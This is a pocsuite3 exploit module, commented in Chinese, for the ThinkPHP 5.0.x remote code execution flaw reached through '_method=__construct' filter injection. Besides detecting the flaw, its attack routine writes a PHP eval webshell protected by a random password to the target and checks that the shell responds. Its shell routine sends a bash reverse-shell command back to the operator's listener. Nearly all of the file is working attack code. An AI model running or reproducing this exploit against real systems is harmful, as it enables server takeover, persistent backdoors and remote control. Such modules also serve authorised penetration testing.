import urllib

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, \
    VUL_TYPE, REVERSE_PAYLOAD
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list


class ThinkphpPoc(POCBase):
    vulID = '97767'  # ssvid
    version = '1.0'
    author = 'mhx'
    vulDate = '2022-11-11'
    createDate = '2022-11-11'
    updateDate = '2022-1-11'
    references = ['https://www.seebug.org/vuldb/ssvid-97765']
    name = 'Thinkphp 5.0.x 远程代码执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'thinkphp'
    appVersion = 'thinkphp5.0.23'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://192.168.3.78:8080/"]
    install_requires = []
    desc = '''Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。'''
    pocDesc = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"

    def _check(self):
        vul_lst = []

        self.path = "/index.php?s=captcha"
        url = self.url + self.path
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
                   "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}

        data = {"_method": "__construct", "filter[]": "phpinfo", "method": "get", "server[REQUEST_METHOD]": "1"}
        try:
            response = requests.post(url, headers=headers, data=data, verify=False, timeout=5,
                                     allow_redirects=False)
            if 'PHP Extension Build' in response.text:
                vul_lst.append(url)
        except Exception as e:
            print(e)
        finally:
            return vul_lst

    def _verify(self):
        result = {}
        vul_lst = self._check()
        if vul_lst:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = self.pocDesc
            result['VerifyInfo']['Path'] = self.path

        return self.parse_output(result)

    def _attack(self):
        result = {}
        # 生成一个随机的webshell文件名
        filename = random_str(6) + ".php"
        # 生成随机密码
        passwd = random_str(6)
        self.path = "/index.php?s=captcha"
        url = self.url + self.path
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
                   "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
        # 通过system函数执行写一句话
        # 特别注意关于一句话内容的url编码

        cmd = f"echo \<?php \@eval\(\$_POST[{passwd}]\)\;?\>> {filename}"
        #cmd_byte = cmd.encode('utf-8')
        #url_cmd = urllib.parse.quote(cmd_byte)

        # 这里data只能使用字符串类型,才能成功,因为如果不用字符串类型,[]会被requests模块自动识别识别特殊字符
        # 会进行url编码,导致payload攻击不成功
        data = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": cmd}
        # data = f"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={url_cmd}"


        try:
            requests.post(url, headers=headers, data=data, verify=False, timeout=5,
                          allow_redirects=False,)


            # 检测webshell
            r = requests.post(self.url + "/" + filename, data=f"{passwd}=phpinfo();", headers=headers)
            if r.status_code == 200 and "PHP Extension Build" in r.text:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/" + filename
                result['ShellInfo']['Content'] = passwd
        except Exception as e:
            print(e)

        return self.parse_output(result)

    def _shell(self):
        """
        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
        """
        # 反弹shell的命令
        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        # print(cmd)
        # 因为特殊字符的原因进行cmd的url编码
        #cmd_byte = cmd.encode('utf-8')
        #url_cmd = urllib.parse.quote(cmd_byte)
        # print(url_cmd)

        # 攻击代码 execute cmd
        self.path = "/index.php?s=captcha"
        url = self.url + self.path
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
                   "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}

        data = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": cmd}
        # data = f"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={url_cmd}"

        try:
            requests.post(url, headers=headers, data=data, verify=False, timeout=5,
                          allow_redirects=False)
        except Exception as e:
            print(e)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

# 注册 ThinkphpPoc 类
register_poc(ThinkphpPoc)
